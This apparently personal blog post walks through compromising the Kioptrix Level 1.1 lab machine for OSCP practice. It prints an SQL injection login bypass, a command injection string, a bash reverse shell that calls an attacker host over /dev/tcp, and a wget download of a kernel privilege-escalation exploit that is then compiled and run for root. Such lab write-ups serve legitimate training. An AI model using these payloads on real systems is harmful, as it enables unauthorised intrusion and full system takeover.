<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-language content="en">
<meta name=color-scheme content="light dark">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
<meta name=author content="Kiel Vaughn">
<meta name=description content="Kioptrix Level 1.1 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next, I ran threader3000 and let it run it&rsquo;s suggested nmap scan to enumerate the open ports.">
<meta name=keywords content="blog,cybersecurity,personal">
<meta name=twitter:card content="summary">
<meta name=twitter:title content=" Kioptrix - Level 1.1">
<meta name=twitter:description content="Kioptrix Level 1.1 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next, I ran threader3000 and let it run it&rsquo;s suggested nmap scan to enumerate the open ports.">
<meta property="og:title" content=" Kioptrix - Level 1.1">
<meta property="og:description" content="Kioptrix Level 1.1 is a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next, I ran threader3000 and let it run it&rsquo;s suggested nmap scan to enumerate the open ports.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-08-07-kioptrix-level-1.1/"><meta property="article:section" content="ctfs">
<meta property="article:published_time" content="2020-08-08T00:00:00+00:00">
<meta property="article:modified_time" content="2020-08-08T00:00:00+00:00">
<title>
Kioptrix - Level 1.1 · Kiel Vaughn, CISSP
</title>
<link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-08-07-kioptrix-level-1.1/>
<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
<link rel=apple-touch-icon href=/assets/img/cissp.ico>
<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
<meta name=generator content="Hugo 0.91.2">
</head>
<body class="preload-transitions colorscheme-dark">
<main class=wrapper>
<nav class=navigation>
<section class=container>
<a class=navigation-title href=/>
Kiel Vaughn, CISSP
</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle>
<i class="fa fa-bars fa-fw" aria-hidden=true></i>
</label>
<ul class=navigation-list>
<li class=navigation-item>
<a class=navigation-link href=/whoami/>whoami</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/certifications/>certifications</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/posts/>blog</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
</li>
</ul>
</section>
</nav>
<div class=content>
<section class="container post">
<article>
<header>
<div class=post-title>
<h1 class=title>
<a class=title-link href=https://www.kielvaughn.com/ctfs/2020-08-07-kioptrix-level-1.1/>
Kioptrix - Level 1.1
</a>
</h1>
</div>
<div class=post-meta>
<div class=date>
<span class=posted-on>
<i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-08-08T00:00:00Z>
August 8, 2020
</time>
</span>
<span class=reading-time>
<i class="fa fa-clock-o" aria-hidden=true></i>
3-minute read
</span>
</div>
<div class=tags>
<i class="fa fa-tag" aria-hidden=true></i>
<span class=tag>
<a href=/tags/oscp/>OSCP</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/sql-injection/>SQL injection</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/command-execution/>command execution</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/privilege-escalation/>privilege escalation</a>
</span></div>
</div>
</header>
<div>
<p><a href=https://www.vulnhub.com/entry/kioptrix-level-11-2,23/>Kioptrix</a> Level 1.1 is a vulnerable machine found on the <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">NetSecFocus Trophy Room</a> list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.</p>
<p>First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used <strong>netdiscover -i eth0</strong> until I came across the IP of this machine.</p>
<p><img src=/assets/img/KioptrixLevel21.png alt="Kioptrix Level 1.1 netdiscover"></p>
<p>Next, I ran <strong>threader3000</strong> and let it run it&rsquo;s suggested nmap scan to enumerate the open ports.</p>
<p><img src=/assets/img/KioptrixLevel22.png alt="Kioptrix Level 1.1 threader3000"></p>
<p><img src=/assets/img/KioptrixLevel23.png alt="Kioptrix Level 1.1 nmap"></p>
<p>Let&rsquo;s take a look at the websites on ports 80 and 443 to start. The same site comes up asking you to login both over http and https.</p>
<p><img src=/assets/img/KioptrixLevel24.png alt="Kioptrix Level 1.1 website"></p>
<p>We know mysql is running on port 3306 based on nmap, so let&rsquo;s try to use basic SQL injection to see if we can bypass authentication. For the username I entered <strong>admin</strong> and for the password I entered <strong>' or 1=1 &ndash; -</strong></p>
<p>This allowed me to bypass authentication and leads me to a screen that allows me to ping a machine on the network.</p>
<p><img src=/assets/img/KioptrixLevel25.png alt="Kioptrix Level 1.1 Basic Admin Console"></p>
<p>Let&rsquo;s enter the following and see what happens: <strong>127.0.0.1;whoami</strong>. This causes another tab to open up, where it shows the results of pinging localhost along with the user on the last line (apache). This confirms that this is open to command injection!</p>
<p><img src=/assets/img/KioptrixLevel26.png alt="Kioptrix Level 1.1 command injection"></p>
<p>Open up a new terminal window from your attacker pc and run <strong>nc -nvlp 4444</strong> to start a listener on port 4444.</p>
<p><img src=/assets/img/KioptrixLevel27.png alt="Kioptrix Level 1.1 nc listener"></p>
<p>Go back to your web browser, close the newly opened tab with the ping/whoami output, and go back to the admin web console. Enter <strong>127.0.0.1;bash -i >& /dev/tcp/[attacker ip]/4444 0>&1</strong> and click on submit.</p>
<p><img src=/assets/img/KioptrixLevel28.png alt="Kioptrix Level 1.1 command injection reverse shell"></p>
<p>Once submitted, look at your terminal with the netcat listener, you should have a reverse bash shell.</p>
<p><img src=/assets/img/KioptrixLevel29.png alt="Kioptrix Level 1.1 reverse shell"></p>
<p>Running <strong>whoami</strong> shows that you are the <strong>apache</strong> user. Running <strong>uname -a</strong> shows that this is using Linux Kernel <strong>2.6.9-55.EL</strong> on an i386 platform.</p>
<p><img src=/assets/img/KioptrixLevel210.png alt="Kioptrix Level 1.1 whoami uname -a"></p>
<p>On another terminal window on your attacker pc, run <strong>searchsploit 2.6.x</strong>, and you will find a Local Privilege Escalation exploit as shown below:</p>
<p><img src=/assets/img/KioptrixLevel211.png alt="Kioptrix searchsploit Linux Kernel"></p>
<p>Let&rsquo;s run <strong>searchsploit -m 9545</strong> to make a copy of this script in our current directory and run <strong>python3 -m http.server</strong> to serve up a python HTTP server.</p>
<p><img src=/assets/img/KioptrixLevel212.png alt="Kioptrix Level 1.1 searchsploit copy python http server"></p>
<p>From your apache shell on the victim computer, run <strong>cd /tmp</strong> followed by <strong>wget http://[attacker ip]:8000/9545.c</strong></p>
<p><img src=/assets/img/KioptrixLevel213.png alt="Kioptrix Level 1.1 wget copy exploit"></p>
<p>Next, run <strong>cat 9545.c</strong> and look at the comments, you will see a section on how to compile this exploit.</p>
<p><img src=/assets/img/KioptrixLevel214.png alt="Kioptrix Level 1.1 cat exploit"></p>
<p>To compile this exploit, run <strong>gcc -Wall -o 9545 9545.c</strong>, as the filename we&rsquo;re using is 9545.c instead of linux-sendpage.c. This will create an executable called 9545 in the /tmp folder.</p>
<p><img src=/assets/img/KioptrixLevel215.png alt="Kioptrix Level 1.1 compile exploit"></p>
<p>As you can see, this compiled as <strong>9545</strong> and is executable. run <strong>./9545</strong> and you should end up with a root shell!</p>
<p><img src=/assets/img/KioptrixLevel216.png alt="Kioptrix Level 1.1 root shell"></p>
<p>That&rsquo;s it! There wasn&rsquo;t any flags I could find like in Level 1, so I don&rsquo;t believe there is one present on this box.</p>
</div>
<footer>
</footer>
</article>
</section>
</div>
<footer class=footer>
<section class=container>
©
2020 -
2022
Kiel Vaughn
</section>
</footer>
</main>
<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
</body>
</html>